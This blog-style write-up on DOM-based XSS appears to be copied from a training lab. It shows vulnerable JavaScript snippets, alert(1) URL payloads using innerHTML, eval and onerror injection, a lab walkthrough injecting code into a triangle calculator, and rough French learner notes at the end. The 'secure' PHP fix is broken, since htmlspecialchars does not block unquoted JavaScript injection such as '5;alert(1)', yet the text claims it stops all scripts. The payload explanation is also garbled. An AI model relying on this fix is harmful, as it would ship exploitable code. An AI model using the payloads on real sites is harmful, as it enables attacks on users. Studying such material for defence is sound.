---
layout: post
title: "dom based xss"
date: 2026-09-16 12:00:00 +0000
categories: [writeup]
tags: [htb]
---


[[Cross-site Scripting (XSS)]]

## DOM-based XSS

DOM-based XSS is a type of attack that occurs when a web page's client-side scripts (JavaScript) manipulate the Document Object Model (DOM) in an unsafe way. Unlike other XSS types, malicious scripts are not directly placed in the HTML code of the page but are instead executed through client-side interactions, modifying the DOM. The triggering and execution method is similar to Reflected and Stored XSS, with the primary difference being the manipulation of the DOM.

These attacks occur when client-side JavaScript processes data from untrusted sources and then interprets that data in a way that allows code execution. This typically involves functions such as

eval()

or

innerHTML

, which can execute or modify HTML and JavaScript code.

eval()

: This JavaScript function evaluates a string as JavaScript code and executes it.

```auto
var userInput = 'console.log(1)';
eval(userInput); // output : 1
```

In this example, the user input

console.log(1)

is evaluated by

eval()

, resulting in the number

1

being logged to the console.

innerHTML

: This property is used to set or get the HTML content of an element, allowing dynamic modification of the page's HTML structure.

```auto
document.getElementById('example').innerHTML = 'Hello, World!';
```

This JavaScript code updates the content of the HTML element with the id

example

to

Hello, World!

, dynamically changing the element's content.

### Document Object Model (DOM)

The Document Object Model (DOM) is a programming interface that represents the structure, style, and content of a web document in a format that is accessible and editable. It is a standard for HTML and XML documents and enables dynamic updates to web pages. The DOM is structured as a tree, where each part of the document is represented as a node.

DOM Structure

- **Nodes:** Each element, text, comment, and other types in a DOM tree are represented as nodes. For instance, every tag like
    
    <div>
    
    ,
    
    <p>
    
    ,
    
    <span>
    
    in an HTML document is an element node.
- **Attributes:** The attributes (e.g.,
    
    class
    
    ,
    
    id
    
    ,
    
    style
    
    ) of elements carry special information related to those elements and are accessible as node attributes.
- **Text Nodes:** The text content within HTML elements is stored as text nodes, which are children of the elements that contain the text.

DOM and JavaScript

The DOM is commonly used with JavaScript. JavaScript uses DOM APIs to dynamically change the structure, style, and content of a web page. This allows updating page content even after the page has loaded, providing powerful capabilities to web developers. JavaScript along with DOM manipulation can:

- **Add/Remove Elements:** Add new HTML elements to the page or remove existing ones.
- **Modify Attributes:** Update the attributes like class, style, or other properties of elements.
- **Event Management:** Attach event listeners to elements to handle user interactions such as clicks and mouse movements.

Importance of the DOM

The DOM provides developers with powerful tools to respond dynamically to user interactions and update content in real-time. For example, when a user fills out a form or clicks a button, JavaScript can make changes to the DOM, updating the page without needing a full page reload.

DOM plays a crucial role in making modern web applications dynamic and interactive, holding a central position in web technologies.

### DOM-based XSS Attack Examples

DOM-based XSS involves the manipulation of the DOM by client-side scripts. These vulnerabilities occur not during the initial page load from the server, but during the execution of client-side scripts.

Below are some common examples, their source code, and how they can be exploited:

1. Injecting Script from URL Fragment to DOM

**Source Code:**

```auto
document.getElementById('output').innerHTML = window.location.hash.substring(1);
```

**Payload:**

```auto
https://example.com#<script>alert(1)</script>
```

In this example, the fragment part of the URL (

#<script>alert(1)</script>

) is assigned directly to the

innerHTML

property of an HTML element, causing the browser to execute the JavaScript.

2. Using eval Function to Execute XSS

**Source Code:**

```auto
window.onload = function() {
    const productId = new URLSearchParams(window.location.search).get('id');
    eval('getProduct('+ productId.toString()+')');
}
```

**Payload:**

```auto
https://example.com/products?id=');alert(1)//
```

The above code takes the

id

parameter from the URL and uses the

eval()

function to call

getProduct()

. However, this allows injecting JavaScript code.

In this payload, the

id

parameter ends with a closing parenthesis (

'

), followed by

);

, ending the current

eval()

call. The

alert(1);

function is then called, followed by

//

, which comments out the rest of the code.

As a result, when the page loads, the

eval()

function executes the JavaScript code, displaying an alert box in the browser with the message

1

.

3. XSS Using innerHTML

**Source Code:**

```auto
document.getElementById('content').innerHTML = unescape(location.search.substring(1));
```

**Payload:**

```auto
https://example.com?%3Cscript%3Ealert(1)%3C/script%3E
```

In this scenario, user input (

location.search

) is directly assigned to

innerHTML

, which can execute any hazardous scripts if the input contains malicious code.

4. Using onerror Event for XSS

**Source Code:**

```auto
<img src="" id="image">
<script>
  document.getElementById('image').src = location.hash.substring(1);
</script>
```

**Payload:**

```auto
https://example.com#invalid-image" onerror="alert(1)
```

Here, the

src

attribute of an

img

element is set to the URL's hash part. If the hash is manipulated to trigger the

onerror

event, it can execute the JavaScript code.

### Implementing a DOM-based XSS Attack

Application Examination

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/72c96903-30fc-450d-9f4c-8184e9226870/dom-based-xss-normal-5cb621279.webp)

It appears to be an application that calculates the area of a triangle based on height and base values. To understand its working principle, values are entered and tested.

**Payload:**

```auto
https://example.com/?height=5&base=12
```

**Affected Code:**

```auto
<script>
  var height = 5;
  var base = 12;
  var ans = base * height / 2;
  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
</script>
```

By inspecting the source code of the section where data is entered using the browser's developer tools (F12), it is seen that values assigned to variables

height

and

base

are included in the JavaScript within the HTML. This appears to be an exploitable point.

Detecting the Vulnerability

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/72c96903-30fc-450d-9f4c-8184e9226870/dom-based-xss-payload-80facdadb.webp)

A payload triggering an alert box displaying the number

1

is entered into the height field.

**Payload:**

```auto
https://example.com/?height=5; alert(1)&base=12
```

**Affected Code:**

```auto
<script>
  var height = 5;alert(1);
  var base = 12;
  var ans = base * height / 2;
  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
</script>
```

With the given payload, the

height

variable is closed with

;

, and the

alert(1);

function is included.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/72c96903-30fc-450d-9f4c-8184e9226870/dom-based-xss-alert-5e41083a3.webp)

Source Code Analysis

The primary cause of the vulnerability is the direct rendering of user input in the browser without sufficient checks or filtering. This situation leads to security issues and especially XSS attacks.

Vulnerable Code Example

```auto
<?php
    if (isset($_GET['base']) && isset($_GET['height'])) {
        echo '<div class="alert alert-success" id="answer"></div>';
        echo '<script>';
        echo 'var height = ' . $_GET['height'] . ';';
        echo 'var base = ' . $_GET['base'] . ';';
        echo 'var ans = base * height / 2;';
        echo 'document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;';
        echo '</script>';
    }
?>
```

This code snippet directly includes user-provided

base

and

height

values into JavaScript code. If these parameters contain malicious content, they can be executed in the browser, causing an XSS attack.

Secure Code Example

```auto
<?php
    if (isset($_GET['base']) && isset($_GET['height'])) {
        $base = htmlspecialchars($_GET['base'], ENT_QUOTES, 'UTF-8');
        $height = htmlspecialchars($_GET['height'], ENT_QUOTES, 'UTF-8');

        echo '<div class="alert alert-success" id="answer"></div>';
        echo '<script>';
        echo 'var height = ' . $height . ';';
        echo 'var base = ' . $base . ';';
        echo 'var ans = base * height / 2;';
        echo 'document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;';
        echo '</script>';
    }
?>
```

In this revised code,

htmlspecialchars

function is used to convert user inputs into HTML entities, safeguarding against XSS attacks. This function translates HTML-specific characters (

<

,

>

,

&

,

"

,

'

etc.) into their HTML entities (

&lt;

,

&gt;

,

&amp;

,

&quot;

,

&#039;

etc.), ensuring these characters are treated as plain text by the browser. This method prevents malicious scripts from being executed regardless of user input.
eval('getProduct('+ productId.toString()+')');
eval('getProduct('5')');
eval('table');

```auto
https://example.com/products?id=');alert(1)//
```

eval('getProduct('+ productId.toString()+')');
eval('getProduct('+');alert(1)//')');


```auto
<script>
  var height = 5;
  var base = 12;
  var ans = base * height / 2;
  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
</script>
``` 
ici si on a un lien url qui montre la réponse avec les paramètres en dur en pourrait tenter d'injecter du code 

<script>
  var height =12;alert(1) ;
  var base = 12;
  var ans = base * height / 2;
  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
</script>

<script>
  var height =12;alert(1) ;
  var base = 12;
  var ans = base * height / 2;
  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
</script>